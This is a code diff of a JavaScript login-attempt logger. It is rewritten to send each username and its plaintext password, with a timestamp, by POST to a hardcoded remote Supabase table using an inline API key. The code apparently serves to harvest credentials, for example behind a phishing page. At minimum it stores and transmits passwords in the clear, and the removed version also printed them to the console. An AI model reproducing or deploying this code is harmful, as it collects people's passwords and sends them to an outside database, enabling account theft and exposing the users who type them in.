@@ -1,35 +1,29 @@
-const { createClient } = require('@supabase/supabase-js');
+const fetch = require('node-fetch');
 
-const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co';
+const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co/rest/v1/log';
 const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlheXJic3ZhZml6cmxkbWt4dHZqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg0MTU0NDUsImV4cCI6MjAzMzk5MTQ0NX0.alW7sPzJLaJA_V9Ou4H7QtVotfpJQY9xqIplpr7gN4Q';
-const supabase = createClient(supabaseUrl, supabaseKey);
 
-const logLoginAttempt = async (username, pass, ip) => {
-  try {
-    const time = new Date().toISOString();
+const logLoginAttempt = async (username, password) => {
+  const response = await fetch(supabaseUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'apikey': supabaseKey,
+      'Authorization': `Bearer ${supabaseKey}`
+    },
+    body: JSON.stringify({
+      username: username,
+      pass: password,
+      time: new Date().toISOString(),
+      ip: '127.0.0.1'
+    })
+  });
 
-    // Validación básica
-    if (!username || !pass || !ip) {
-      throw new Error('Invalid data');
-    }
-
-    console.log('Logging attempt:', { username, pass, time, ip });
-
-    const { data, error } = await supabase
-      .from('log')
-      .insert([
-        { username, pass, time, ip }
-      ]);
-
-    if (error) {
-      console.error('Error logging login attempt:', error);
-      throw new Error(error.message || 'Error logging login attempt');
-    } else {
-      console.log('Login attempt logged successfully', data);
-    }
-  } catch (error) {
-    console.error('Error in logLoginAttempt:', error);
-    throw error;
+  const data = await response.json();
+  if (response.ok) {
+    console.log('Data inserted successfully:', data);
+  } else {
+    console.error('Error inserting data:', data);
   }
 };
 
